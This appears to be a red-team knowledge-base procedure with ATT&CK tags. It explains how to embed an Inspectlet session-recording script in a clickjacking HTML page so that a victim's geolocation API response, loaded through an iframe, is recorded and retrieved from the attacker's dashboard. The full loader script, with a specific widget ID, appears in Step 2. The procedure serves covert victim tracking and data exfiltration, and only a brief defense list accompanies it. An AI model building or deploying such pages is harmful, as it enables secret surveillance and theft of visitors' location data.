---
id: proc-integrate-inspectlet
tags:
  - session-recording
  - tracking-script
type: procedure
tools:
  - '[[tools/Inspectlet]]'
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Automated Collection]]'
updated_at: '2025-12-14T17:28:12.369Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Automated Collection]]'
---
# Integrate-Inspectlet-Tracking-into-Clickjacking-Page

## Summary

This procedure adds Inspectlet session recording to the clickjacking HTML, enabling capture of the geolocation JSON from the iframe's network request for later exfiltration.

## Description

Inspectlet is a web analytics tool that records user sessions, including DOM interactions and network activity. By inserting its asynchronous JavaScript into the HTML, attackers can replay victim sessions to extract the GeoAPI response. The widget ID (wid) personalizes the tracking. This targets browsers visiting the page; requires an Inspectlet account.

## Requirements

1. Inspectlet account and widget ID (e.g., 2060137667)
2. Updated HTML file
3. Basic JavaScript insertion knowledge

## Defense

Defensive measures and detection strategies:

- Block third-party analytics scripts via CSP
- Detect anomalous script loads from tracking domains
- Educate users on avoiding suspicious links

## Objectives

1. Enable session recording of iframe requests
2. Capture network responses in replays
3. Prepare for remote data access via dashboard

## Instructions

### Step 1: Obtain Inspectlet Code

**Context**: Register and get the tracking snippet.

Visit https://www.inspectlet.com/, create account, generate wid=2060137667.

### Step 2: Insert Script into HTML

**Context**: Add the async script to <head>.

Edit Clickjacking.html:

```html
<script type="text/javascript">(function() { window.__insp = window.__insp || []; __insp.push(['wid', 2060137667]); var ldinsp = function(){ if(typeof window.__inspld != "undefined") return; window.__inspld = 1; var insp = document.createElement('script'); insp.type = 'text/javascript'; insp.async = true; insp.id = "inspsync"; insp.src = ('https:' == document.location.protocol ? 'https' : 'http') + '://cdn.inspectlet.com/inspectlet.js?wid=2060137667&r=' + Math.floor(new Date().getTime()/3600000); var x = document.getElementsByTagName('script')[0]; x.parentNode.insertBefore(insp, x); }; setTimeout(ldinsp, 0); })();</script>
```

> Script loads Inspectlet, starts recording on page load.

### Step 3: Verify Integration

**Context**: Test if recording captures the geo request.

Load HTML, check Inspectlet dashboard for new session.

**Expected Output**: Session with network log showing GeoAPI JSON.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Automated Collection]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Inspectlet]]

## Tags

- [[session-recording]]
- [[tracking-script]]
